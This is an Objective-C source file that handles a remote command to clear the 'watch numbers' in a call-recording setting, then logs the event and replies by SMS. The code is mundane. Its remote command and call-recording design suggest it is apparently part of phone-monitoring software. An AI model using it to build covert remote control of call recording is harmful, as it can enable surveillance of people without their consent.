/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ClearCallRecordWatchNumberProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "ClearCallRecordWatchNumberProcessor.h"
#import "PrefCallRecord.h"
#import "PreferenceManager.h"

@interface ClearCallRecordWatchNumberProcessor (PrivateAPI)
- (void) processClearCallRecordWatchNumber;
- (void) sendReplySMS;
@end

@implementation ClearCallRecordWatchNumberProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ClearCallRecordWatchNumberProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self(ClearCallRecordWatchNumberProcessor)
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearCallRecordWatchNumberProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor PrivateAPI Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearCallRecordWatchNumberProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ClearCallRecordWatchNumberProcessor--->doProcessingCommand")
 	[self processClearCallRecordWatchNumber];
}

#pragma mark ClearCallRecordWatchNumberProcessor PrivateAPI Methods

/**
 - Method name: processClearCallRecordWatchNumber
 - Purpose:This method is used to process clear watch number
 - Argument list and description: No Argument
 - Return description: No Return type
*/

- (void) processClearCallRecordWatchNumber {
	DLog (@"ClearCallRecordWatchNumberProcessor--->processClearCallRecordNumbers");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefCallRecord *prefCallRecord = (PrefCallRecord *) [prefManager preference:kCallRecord];
	NSMutableArray *watchNumberList=[[NSMutableArray alloc] init];
	[prefCallRecord setMWatchNumbers:watchNumberList];
	[prefManager savePreferenceAndNotifyChange:prefCallRecord];
	[watchNumberList release];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ClearCallRecordWatchNumberProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
